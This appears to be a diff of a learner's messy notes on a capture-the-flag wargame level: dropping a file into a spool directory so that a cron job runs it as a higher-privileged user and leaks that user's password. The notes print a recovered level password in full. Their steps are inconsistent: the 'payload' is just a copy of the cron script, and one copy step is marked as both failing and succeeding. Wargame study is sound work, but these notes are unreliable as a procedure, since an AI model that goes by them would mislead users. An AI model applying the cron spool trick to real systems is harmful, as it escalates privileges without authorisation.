@@ -1,121 +1,50 @@
-can't remove : Permission denied ??why??
+$ /usr/bin/cronjob_bandit24.sh
+can't remove : Permission denied        # Reason ---> if [ "${owner}" = "bandit23" ]; failes  (OWNER = bandit24 ,USER  = bandit23)
 
-ls -las /usr/bin/cronjob_bandit24.sh
-PERMISSIONS      OWNER      GROUP       SIZE        DATE            FILENAME
-4 -rwxr-x--- 1   bandit24   bandit23    384         Oct 14 09:26    /usr/bin/cronjob_bandit24.sh
-
-$ pwd
-/etc/cron.d
-
-OWNER = bandit24 
-USER  = bandit23
-if [ "${owner}" = "bandit23" ]; failes  -----------> can't remove : Permission denied  
-
-
-
-/var/spool/$myname/foo
-
-Task : create /tmp/1.sh  -> +x -> execute
-
-
-_______________________________________________________________________________________________________________
 
 $   ls -las /usr/bin/cronjob_bandit24.sh
     PERMISSIONS      OWNER      GROUP       SIZE        DATE            FILENAME
     4 -rwxr-x--- 1   bandit24   bandit23    384         Oct 14 09:26    /usr/bin/cronjob_bandit24.sh
 
-$   pwd
-    /etc/cron.d
+
+$   mktemp -d
+    /tmp/tmp.TCLvT8WfXl
 
 
-$   cd /tmp ; cp /usr/bin/cronjob_bandit24.sh ./
-$   ls -las cronjob_bandit24.sh
-    PERMISSIONS      OWNER      GROUP       SIZE        DATE            FILENAME
-    4 -rwxr-x--- 1   bandit23   bandit23    384         Dec 20 08:05    cronjob_bandit24.sh
+$   cd /tmp/tmp.TCLvT8WfXl    ;    cp  /usr/bin/cronjob_bandit24.sh  ./1.sh
 
-$   pwd
-    /tmp
+/tmp/tmp.TCLvT8WfXl$    ls -las 1.sh
+                        PERMISSIONS      OWNER      GROUP       SIZE        DATE            FILENAME
+                        4 -rwxr-x--- 1   bandit23   bandit23    384         Dec 21 20:00    1.sh
 
+/tmp/tmp.TCLvT8WfXl$    /usr/bin/cronjob_bandit24.sh
+                        Error line 5: cd: /var/spool/bandit23/foo: No such file or directory
 
-myname="bandit24"
-
-
-/tmp/bandit24_pass
+/tmp/tmp.TCLvT8WfXl$ cp ./1.sh /var/spool/bandit24/foo/
 
 
-
-
-
-YOU (bandit23)
-   ↓ drop file
-/var/spool/bandit24/foo
-   ↓ cron
-RUNS AS bandit24
-   ↓
-writes password to /tmp
-
-
-
-
-/usr/bin/cronjob_bandit24.sh
-
-
-owner = bandit24 its owner of file or folder?
-
-
-
-
-$   cp /usr/bin/cronjob_bandit24.sh payload.sh
-or 
-/tmp$   cp /usr/bin/cronjob_bandit24.sh bandit24_pass
-
-
-*************mtemp -d  ??????????????   vs temp    c
-
-
-
-
-/etc/bandit_pass/bandit24 
-
-
-
-/var/spool/$myname/foo
-
-cat /usr/bin/cronjob_bandit24.sh
-
-
-
-
-myname=$(whoami)
-cd /var/spool/$myname/foo
-if [ "${owner}" = "bandit23" ];
-
-whoami != owner right?
-owner is bandit23
-and whoami is bandit24 
-if yes
-but in /tmp whoami is 23 then how it is possibel that /var/spool/bandit24/foo whoami is 24 ?
-
-
+⌛⌛Wait 1 minute for cron to execute⌛⌛
+$   cat /tmp/bandit24/bandit24_password.txt
+    gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ✅
 
 _______________________________________________________________________________________________________________
 
-whoami ≠ owner
+➡️ whoami ≠ owner
 
-bandit23@bandit$ whoami
-bandit23
-
-What happens when CRON runs the script
+➡️ What happens when CRON runs the script
 /usr/bin/cronjob_bandit24.sh AS USER bandit24
 whoami  → bandit24
-
-
-
-Thing	Value
-whoami	bandit24
-directory	/var/spool/bandit24/foo
-file owner	bandit23
-condition	TRUE
+__________________________________________
+|  Thing	 |    Value                   |
+|____________|____________________________|
+|  whoami	 |    bandit24                |
+|____________|____________________________|
+|  directory |    /var/spool/bandit24/foo |
+|____________|____________________________|
+|  file owner|    bandit23                |
+|____________|____________________________|
+|  condition |    TRUE                    |
+|____________|____________________________|
 
 ✔️ Executed as bandit24
 ✔️ File owned by bandit23
@@ -123,47 +52,22 @@ condition	TRUE
 bandit23 → can write files there
 bandit24 → executes them
 
-
-
 _______________________________________________________________________________________________________________
 
 [ YOU ] bandit23
    |
-   |-- create payload.sh (owner = bandit23)
-   |-- copy to /var/spool/bandit24/foo
+   |-- Intially /usr/bin/cronjob_bandit24.sh                         ❌(OWNER = bandit24)  if condition fails 
+   |-- $ cp /usr/bin/cronjob_bandit24.sh /tmp/tmp.TCLvT8WfXl         ✅(OWNER = bandit23)  if condition pass  
+   |-- $ /tmp/tmp.TCLvT8WfXl$ cp ./1.sh /var/spool/bandit24/foo/     ❌(whoami = bandit23  and cd: /var/spool/bandit23/foo: No such file or directory 
+   |-- copy to /var/spool/bandit24/foo so cronjob can execute 1.sh   ✅(whoami = bandit24) but /var/spool/bandit24/foo  exists
    |
-[ CRON ] bandit24
+[ CRON ] bandit24 
    |
-   |-- whoami = bandit24
-   |-- cd /var/spool/bandit24/foo
-   |-- sees file owned by bandit23
-   |-- executes it AS bandit24
-
-
-
-
-
-bandit23@bandit:/tmp$ ls
-ls: cannot open directory '.': Permission denied
-
-
-band
-
-it23@bandit:/tmp/tmp.kurMrLYM6I$ ls
-1.sh
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-cat /tmp/bandit24/bandit24_password.txt
+   |-- whoami = bandit24, OWNER = bandit23✅
+   |-- ⌛Wait 1 minute for cron to execute⌛
+   |-- execute 1.sh  automatically in every 1 minute 
+   |-- cron writes password to /tmp/bandit24/bandit24_password.txt
+   |
+[ YOU ] bandit23
+   |
+   |-- cat /tmp/bandit24/bandit24_password.txt
